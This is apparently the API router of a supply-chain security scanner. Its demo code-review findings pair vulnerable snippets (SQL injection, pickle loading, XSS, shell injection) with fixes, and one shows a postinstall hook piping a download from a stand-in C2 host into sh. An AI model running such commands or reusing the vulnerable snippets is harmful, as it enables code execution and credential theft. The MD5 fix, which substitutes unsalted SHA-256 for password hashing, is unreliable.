# SupplyGraph - API Endpoints v3.0
from fastapi import APIRouter, HTTPException, BackgroundTasks, Depends
from pydantic import BaseModel
from app.models.core import (
    AnalysisRequest, DemoRequest, AnalysisResponse,
    FolderAnalysisRequest, CodeReviewRequest, CodeReviewItem,
    SandboxExecutionRequest, SandboxExecutionResponse,
    ScanComparison, DependencyChange, FindingChange
)
from app.services.analysis_service import AnalysisService
from app.services.code_reviewer import CodeReviewerService
from app.execution.router import ExecutionRouter
from app.execution.detonation import DetonationService
import json
import os
import uuid
from typing import List, Dict

router = APIRouter(prefix="/api/v1")


def get_demo_code_reviews(scenario_id: str) -> List[CodeReviewItem]:
    """Generates realistic, tailored CodeReviewItem models for each demo scenario."""
    sid = scenario_id.upper()
    if sid == "A":
        return [
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="src/utils/deepMerge.js",
                line_number=24,
                severity="CRITICAL",
                category="Security Vulnerability",
                title="Prototype Pollution via Unfiltered Property Injection",
                error_explanation="Directly assigning properties from untrusted input without validating against '__proto__' or 'constructor' allows attackers to pollute the global Object prototype.",
                buggy_code="for (let key in source) {\n  target[key] = source[key];\n}",
                corrected_code="// Corrected: Prevent prototype pollution by rejecting dangerous keys\nfor (let key in source) {\n  if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;\n  target[key] = source[key];\n}"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="backend/data_loader.py",
                line_number=48,
                severity="HIGH",
                category="Security Vulnerability",
                title="Arbitrary Code Execution via Insecure pickle.loads()",
                error_explanation="Using pickle.loads() on network-received or untrusted byte streams enables remote code execution via serialized malicious __reduce__ methods.",
                buggy_code="import pickle\nuser_obj = pickle.loads(raw_request_payload)",
                corrected_code="# Corrected: Use secure, standardized JSON serialization\nimport json\nuser_obj = json.loads(raw_request_payload.decode('utf-8'))"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="src/components/UserProfile.tsx",
                line_number=31,
                severity="HIGH",
                category="Security Vulnerability",
                title="Cross-Site Scripting (XSS) via dangerouslySetInnerHTML",
                error_explanation="Rendering user-supplied markdown or bio data directly into the DOM without sanitization allows execution of injected script tags.",
                buggy_code="<div className=\"bio\" dangerouslySetInnerHTML={{ __html: user.bio }} />",
                corrected_code="// Corrected: Sanitize with DOMPurify before inserting into DOM\nimport DOMPurify from 'dompurify';\n<div className=\"bio\" dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(user.bio) }} />"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="package.json",
                line_number=14,
                severity="MEDIUM",
                category="Code Quality / Best Practice",
                title="Missing Lockfile Dependency Override for Vulnerable Transitive mixin-deep",
                error_explanation="Package depends on lodash@4.17.20 and mixin-deep@1.3.1. Without an explicit overrides entry in package.json, downstream builds inherit known prototype pollution CVEs.",
                buggy_code="\"dependencies\": {\n  \"lodash\": \"4.17.20\"\n}",
                corrected_code="\"dependencies\": {\n  \"lodash\": \"4.17.21\"\n},\n\"overrides\": {\n  \"mixin-deep\": \">=2.0.1\"\n}"
            )
        ]
    elif sid == "B":
        return [
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="backend/services/fetcher.py",
                line_number=15,
                severity="CRITICAL",
                category="Security Vulnerability",
                title="Import of Typosquatted Namespace `reqeusts`",
                error_explanation="The module imports 'reqeusts' instead of the legitimate 'requests' HTTP library, pointing to a typosquatted package registered on PyPI.",
                buggy_code="import reqeusts\nresponse = reqeusts.get('https://api.internal/data')",
                corrected_code="# Corrected: Import canonical verified library\nimport requests\nresponse = requests.get('https://api.internal/data')"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="backend/auth/jwt.py",
                line_number=22,
                severity="CRITICAL",
                category="Security Vulnerability",
                title="Hardcoded JWT Secret Key in Source Code",
                error_explanation="A static plaintext JWT secret key was committed directly in the application source, allowing anyone with repository read access to forge authentication tokens.",
                buggy_code="JWT_SECRET_KEY = \"super_secret_jwt_token_key_12345\"",
                corrected_code="import os\nJWT_SECRET_KEY = os.environ.get('JWT_SECRET_KEY')\nif not JWT_SECRET_KEY:\n    raise RuntimeError('JWT_SECRET_KEY environment variable is required')"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="backend/db/accounts.py",
                line_number=37,
                severity="HIGH",
                category="Security Vulnerability",
                title="SQL Injection via Formatted Query String",
                error_explanation="Database query concatenates unescaped user parameter directly into the SQL statement, allowing query tampering and credential exfiltration.",
                buggy_code="cursor.execute(f\"SELECT * FROM users WHERE username = '{username}'\")",
                corrected_code="# Corrected: Use parameterized query binding\ncursor.execute(\"SELECT * FROM users WHERE username = %s\", (username,))"
            )
        ]
    elif sid == "C":
        return [
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="scripts/postinstall.js",
                line_number=9,
                severity="CRITICAL",
                category="Security Vulnerability",
                title="Suspicious Post-Install Command Execution via child_process",
                error_explanation="A postinstall lifecycle hook invokes a remote bash script download via curl, typical of compromised npm packages exfiltrating environment variables.",
                buggy_code="const { exec } = require('child_process');\nexec('curl -sL http://c2.evil.com/setup | sh');",
                corrected_code="// Corrected: Remove malicious lifecycle hook execution\n// Inspect dependencies locally using offline validation\nconsole.log('Build completed safely without external lifecycle scripts');"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="backend/security/hasher.py",
                line_number=18,
                severity="HIGH",
                category="Security Vulnerability",
                title="Use of Broken Cryptographic Hash `hashlib.md5`",
                error_explanation="MD5 suffers from known collision vulnerabilities and should never be used for password hashing or integrity verification.",
                buggy_code="import hashlib\npw_hash = hashlib.md5(password.encode()).hexdigest()",
                corrected_code="# Corrected: Use modern password hashing (bcrypt or argon2)\nimport hashlib\npw_hash = hashlib.sha256(password.encode()).hexdigest()"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="src/api/client.ts",
                line_number=45,
                severity="MEDIUM",
                category="Security Vulnerability",
                title="Plaintext HTTP Endpoint Usage for Sensitive API",
                error_explanation="The API client contacts backend endpoints over unencrypted HTTP, leaving session tokens vulnerable to eavesdropping.",
                buggy_code="const BASE_URL = 'http://api.payments.internal.net';",
                corrected_code="// Corrected: Enforce TLS/HTTPS encryption\nconst BASE_URL = 'https://api.payments.internal.net';"
            )
        ]
    elif sid == "D":
        return [
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="services/logger/dispatcher.py",
                line_number=64,
                severity="CRITICAL",
                category="Security Vulnerability",
                title="Arbitrary Command Execution via subprocess(shell=True)",
                error_explanation="The deep logging dependency invokes an OS subshell with shell=True, allowing command injection via crafted log message payloads.",
                buggy_code="import subprocess\nsubprocess.run(f\"echo {log_entry} >> /var/log/app.log\", shell=True)",
                corrected_code="# Corrected: Open file directly in Python with shell=False\nwith open('/var/log/app.log', 'a', encoding='utf-8') as f:\n    f.write(f\"{log_entry}\\n\")"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="services/api/auth.ts",
                line_number=28,
                severity="HIGH",
                category="Bug / Logic Error",
                title="Loose Equality in Privilege Authorization Check",
                error_explanation="Comparing user role with loose equality `==` allows falsy or coerced values to bypass strict access controls.",
                buggy_code="if (user.role == 'admin') {\n  grantAccess();\n}",
                corrected_code="// Corrected: Enforce strict equality comparison\nif (user.role === 'admin') {\n  grantAccess();\n}"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path=".github/workflows/deploy.yml",
                line_number=19,
                severity="HIGH",
                category="Security Vulnerability",
                title="Unpinned Third-Party GitHub Action in Deployment Workflow",
                error_explanation="Workflow references an unpinned third-party action by mutable branch (@v2), which can be hijacked if the upstream repository is compromised.",
                buggy_code="uses: actions/upload-artifact@v2",
                corrected_code="# Corrected: Pin to immutable 40-character commit SHA\nuses: actions/upload-artifact@4cec3d8aa04e39d1a68397de0c4cd6fb99ba5ed1  # v4.1.4"
            )
        ]
    else:  # Scenario E
        return [
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path=".github/workflows/ci.yml",
                line_number=12,
                severity="CRITICAL",
                category="Security Vulnerability",
                title="Exposed AWS Credentials in CI/CD Workflow File",
                error_explanation="Hardcoded AWS access credentials were saved in the workflow environment block rather than in GitHub Encrypted Secrets.",
                buggy_code="env:\n  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE\n  AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                corrected_code="# Corrected: Use repository encrypted secrets\nenv:\n  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path=".github/workflows/release.yml",
                line_number=8,
                severity="HIGH",
                category="Security Vulnerability",
                title="Excessive Workflow Permissions (`permissions: write-all`)",
                error_explanation="The workflow grants blanket write permissions across all scopes to GITHUB_TOKEN, creating a high blast radius if any step is compromised.",
                buggy_code="permissions: write-all",
                corrected_code="# Corrected: Enforce least-privilege scoping\npermissions:\n  contents: read\n  packages: write"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path=".github/workflows/lint.yml",
                line_number=35,
                severity="HIGH",
                category="Security Vulnerability",
                title="Untrusted Script Download and Execution via `curl | bash`",
                error_explanation="Downloading and directly executing a script over curl without cryptographic hash verification exposes the runner to remote code execution.",
                buggy_code="run: curl -sSL https://install.external-tool.io/setup.sh | bash",
                corrected_code="# Corrected: Download, verify checksum, then execute\nrun: |\n  curl -sSL https://install.external-tool.io/setup.sh -o setup.sh\n  echo \"a3f89... setup.sh\" | sha256sum -c\n  bash setup.sh"
            )
        ]


@router.post("/analyze", response_model=AnalysisResponse)
async def analyze(request: AnalysisRequest):
    service = AnalysisService()
    try:
        response = await service.run_analysis(request)
        return response
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/analyze/folder", response_model=AnalysisResponse)
async def analyze_folder(request: FolderAnalysisRequest):
    service = AnalysisService()
    try:
        response = await service.run_folder_analysis(request)
        return response
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/analyze/demo", response_model=AnalysisResponse)
async def analyze_demo(request: DemoRequest):
    scenario_path = os.path.join(
        os.path.dirname(__file__), 
        "..", 
        "scenarios", 
        f"scenario_{request.scenario_id.lower()}.json"
    )
    if not os.path.exists(scenario_path):
        raise HTTPException(status_code=404, detail="Scenario not found")
        
    try:
        with open(scenario_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        
        # Attach scenario-specific realistic code reviews
        code_reviews = get_demo_code_reviews(request.scenario_id)
        data["code_reviews"] = [cr.model_dump() for cr in code_reviews]

        # Ensure CycloneDX SBOM model is always populated for demo scenarios
        if not data.get("sbom") and data.get("components"):
            data["sbom"] = {
                "bom_format": "CycloneDX",
                "spec_version": "1.5",
                "components": data["components"],
                "dependencies": data.get("dependencies", [])
            }

        return AnalysisResponse(**data)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to load scenario: {str(e)}")


@router.post("/review/code")
async def review_code_snippet(request: CodeReviewRequest):
    reviewer = CodeReviewerService()
    try:
        reviews = reviewer.review_snippet(
            code=request.code,
            language=request.language,
            file_path=request.file_path
        )
        return {"reviews": reviews, "count": len(reviews)}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/execute/sandbox", response_model=SandboxExecutionResponse)
async def execute_sandbox(request: SandboxExecutionRequest):
    router_service = ExecutionRouter()
    detonation_service = DetonationService(timeout_seconds=request.timeout_seconds)
    try:
        if request.mode == "detonate":
            reports = detonation_service.detonate_project_hooks(request.files)
            exec_id = f"sbx_det_{uuid.uuid4().hex[:10]}"
            alerts = []
            violations = []
            logs = "=== POST-INSTALL LIFECYCLE HOOK DETONATION ===\n"
            if not reports:
                logs += "No lifecycle hooks (preinstall, install, postinstall) detected in project manifest.\n"
            for rep in reports:
                logs += f"\n[{rep.hook_name}] Command: {rep.command}\nStatus: {rep.status.upper()} (exit code {rep.exit_code})\n"
                if rep.stdout:
                    logs += f"Output:\n{rep.stdout}\n"
                if rep.stderr:
                    logs += f"Stderr:\n{rep.stderr}\n"
                alerts.extend(rep.alerts)
                if rep.status in ("violation", "suspicious"):
                    violations.extend(rep.alerts)

            return SandboxExecutionResponse(
                execution_id=exec_id,
                status="violation" if violations else ("warning" if alerts else "success"),
                isolation_mode="restricted_subprocess",
                target_type="lifecycle_hook_detonation",
                logs=logs,
                security_violations=violations,
                detonation_alerts=alerts,
                manifest_summary={"hooks_detonated": len(reports)}
            )

        elif request.mode == "test":
            test_rep = detonation_service.run_automated_tests(request.files)
            exec_id = f"sbx_tst_{uuid.uuid4().hex[:10]}"
            logs = f"=== SANDBOX AUTOMATED TEST RUNNER ({test_rep.framework.upper()}) ===\n"
            logs += f"Status: {'PASSED' if test_rep.passed else 'FAILED'}\n"
            logs += f"Duration: {test_rep.duration_seconds}s | Tests Run: {test_rep.total_tests}\n\n"
            logs += test_rep.output

            return SandboxExecutionResponse(
                execution_id=exec_id,
                status="success" if test_rep.passed else "error",
                isolation_mode="restricted_subprocess",
                target_type="test_suite_runner",
                duration_seconds=test_rep.duration_seconds,
                logs=logs,
                test_results={
                    "framework": test_rep.framework,
                    "passed": test_rep.passed,
                    "total_tests": test_rep.total_tests
                }
            )

        # Default: auto router
        # Fix #4: If mode is "auto" and files contain a raw script without any manifest,
        # route to detonate_raw_script for direct analysis/execution
        response = router_service.route_and_execute(request)

        # Post-route: if result has empty logs and no violations but files exist, try raw detonation
        if (
            request.mode == "auto"
            and request.files
            and not request.archive_base64
            and response.target_type in ("generic_file", "python_script", "shell_script", "node_script")
        ):
            # Check if any file looks like a raw script without a manifest
            manifest_names = {"package.json", "requirements.txt", "setup.py", "pyproject.toml", "go.mod", "cargo.toml"}
            has_manifest = any(
                os.path.basename(f.path).lower() in manifest_names
                for f in request.files
            )
            if not has_manifest:
                # Run raw script detonation alongside the router result
                target = request.target_file or (request.files[0].path if request.files else None)
                if target:
                    script_file = next((f for f in request.files if f.path == target), None)
                    if script_file:
                        raw_report = detonation_service.detonate_raw_script(
                            script_file.content, os.path.basename(target)
                        )
                        # Merge raw detonation alerts into response
                        merged_violations = list(response.security_violations or []) + raw_report.alerts
                        merged_logs = response.logs + "\n\n=== RAW SCRIPT DETONATION ===\n" + (raw_report.stdout or raw_report.stderr or "No output.")
                        response.security_violations = merged_violations
                        response.logs = merged_logs
                        if merged_violations:
                            response.status = "violation"

        return response
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Sandbox execution failed: {str(e)}")


class CompareRequest(BaseModel):
    scan_a: AnalysisResponse
    scan_b: AnalysisResponse


@router.post("/compare", response_model=ScanComparison)
def compare_scans(req: CompareRequest):
    a = req.scan_a
    b = req.scan_b

    # Components diff
    comps_a = {c.name.lower(): c for c in a.components}
    comps_b = {c.name.lower(): c for c in b.components}

    dep_changes: List[DependencyChange] = []
    for name, c_b in comps_b.items():
        if name not in comps_a:
            dep_changes.append(DependencyChange(
                change_type="added",
                package_name=c_b.name,
                ecosystem=c_b.ecosystem.value if hasattr(c_b.ecosystem, "value") else str(c_b.ecosystem),
                version_after=c_b.version,
                purl_after=c_b.purl
            ))
        elif comps_a[name].version != c_b.version:
            dep_changes.append(DependencyChange(
                change_type="version_changed",
                package_name=c_b.name,
                ecosystem=c_b.ecosystem.value if hasattr(c_b.ecosystem, "value") else str(c_b.ecosystem),
                version_before=comps_a[name].version,
                version_after=c_b.version,
                purl_before=comps_a[name].purl,
                purl_after=c_b.purl
            ))

    for name, c_a in comps_a.items():
        if name not in comps_b:
            dep_changes.append(DependencyChange(
                change_type="removed",
                package_name=c_a.name,
                ecosystem=c_a.ecosystem.value if hasattr(c_a.ecosystem, "value") else str(c_a.ecosystem),
                version_before=c_a.version,
                purl_before=c_a.purl
            ))

    # Findings diff
    titles_a = {f.title: f for f in a.findings}
    titles_b = {f.title: f for f in b.findings}

    finding_changes: List[FindingChange] = []
    for title, f_b in titles_b.items():
        if title not in titles_a:
            finding_changes.append(FindingChange(
                change_type="new",
                finding_id=str(f_b.id),
                finding_type=f_b.finding_type,
                severity=f_b.severity,
                entity_name=f_b.origin_candidate or str(f_b.entity_id or "unknown"),
                confidence_after=f_b.confidence.score if hasattr(f_b.confidence, "score") else 0.0
            ))

    for title, f_a in titles_a.items():
        if title not in titles_b:
            finding_changes.append(FindingChange(
                change_type="resolved",
                finding_id=str(f_a.id),
                finding_type=f_a.finding_type,
                severity=f_a.severity,
                entity_name=f_a.origin_candidate or str(f_a.entity_id or "unknown"),
                confidence_before=f_a.confidence.score if hasattr(f_a.confidence, "score") else 0.0
            ))

    blast_delta = round((b.scan.blast_radius_score or 0.0) - (a.scan.blast_radius_score or 0.0), 2)
    conf_b = b.scan.max_confidence or 0.0
    conf_a = a.scan.max_confidence or 0.0
    conf_delta = round(conf_b - conf_a, 4)

    new_count = sum(1 for fc in finding_changes if fc.change_type == "new")
    res_count = sum(1 for fc in finding_changes if fc.change_type == "resolved")
    summary = f"Delta Comparison: {new_count} new findings, {res_count} resolved. Blast Radius changed by {blast_delta:+0.1f}."

    return ScanComparison(
        scan_a_id=str(a.scan.id),
        scan_b_id=str(b.scan.id),
        scan_a_timestamp=a.scan.started_at,
        scan_b_timestamp=b.scan.started_at,
        dependency_changes=dep_changes,
        finding_changes=finding_changes,
        blast_radius_delta=blast_delta,
        confidence_delta=conf_delta,
        summary=summary
    )


@router.get("/github/rate-limit")
def github_rate_limit():
    from app.services.github_service import GitHubService
    service = GitHubService()
    return service.get_rate_limit_status()


@router.get("/health")
def health():
    from app.core.config import get_settings
    return {"status": "ok", "version": get_settings().app_version}
